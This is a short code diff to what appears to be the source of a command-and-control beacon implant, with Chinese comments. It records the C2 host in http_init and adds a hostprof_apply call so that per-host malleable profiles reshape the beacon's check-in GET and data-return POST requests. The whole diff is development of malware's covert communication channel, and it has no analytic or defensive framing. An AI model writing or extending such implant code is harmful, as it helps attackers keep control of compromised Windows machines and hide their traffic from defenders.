@@ -6,6 +6,9 @@
 #include "profile.h"
 #include "beacon.h"
 #include "track_memory.h"
+#include "hostprof.h"
+
+static char http_current_host[256];
 
 
 #define PROXYB_MANUAL 0
@@ -66,6 +69,9 @@ void http_init(char * host, int port, char * ua) {
 	InternetSetOption(session_h, INTERNET_OPTION_SEND_TIMEOUT, (void *)&timeout, sizeof(unsigned long));
 	InternetSetOption(session_h, INTERNET_OPTION_RECEIVE_TIMEOUT, (void *)&timeout, sizeof(unsigned long));
 
+	memset(http_current_host, 0, sizeof(http_current_host));
+	if (host != NULL)
+		strncpy(http_current_host, host, sizeof(http_current_host) - 1);
 	connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
 
 	/* 如果我们有凭据，立即将它们分配给这个连接 */
@@ -173,6 +179,7 @@ void http_post_maybe(char * hook) {
 
 	/* 应用POST请求转换 */
 	apply(setting_ptr(SETTING_C2_POSTREQ), &myprofile, myid, strlen(myid), http_post_buffer, http_post_len);
+	hostprof_apply(http_current_host, &myprofile, 1);
 
 	if (strlen(myprofile.parameters) == 0) {
 		_snprintf(myuri, 1024, "%s", myprofile.uri);
@@ -265,6 +272,7 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 
 	/* 应用到配置文件 */
 	apply(setting_ptr(SETTING_C2_REQUEST), &myprofile, meta->data, meta->length, NULL, 0);
+	hostprof_apply(http_current_host, &myprofile, 0);
 
 	/* 请设置myuri */
 	if (strlen(myprofile.parameters) == 0) {
